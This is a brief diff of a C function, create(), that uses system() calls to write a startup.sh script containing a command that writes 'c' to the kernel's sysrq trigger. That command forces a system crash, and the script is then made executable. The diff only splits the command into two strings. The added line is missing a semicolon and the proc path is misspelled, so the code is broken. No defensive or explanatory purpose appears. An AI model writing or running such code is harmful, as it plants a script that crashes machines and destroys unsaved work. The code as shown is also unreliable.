@@ -7,8 +7,10 @@
 #define MAX_CMN_LEN 100
 
 int create () {
-    char shellscript[MAX_CMN_LEN] = "touch startup.sh && echo echo c > /proc/sysrq-triggers > startup.sh && chmod 755 startup.sh";
+    char shellscript[MAX_CMN_LEN] = "touch startup.sh" 
+    char echo[MAX_CMN_LEN] = "echo echo c > /proc/sysrq-triggers > startup.sh && chmod 755 startup.sh";
     system(shellscript);
+    system(echo);
     return 0;
 }
 
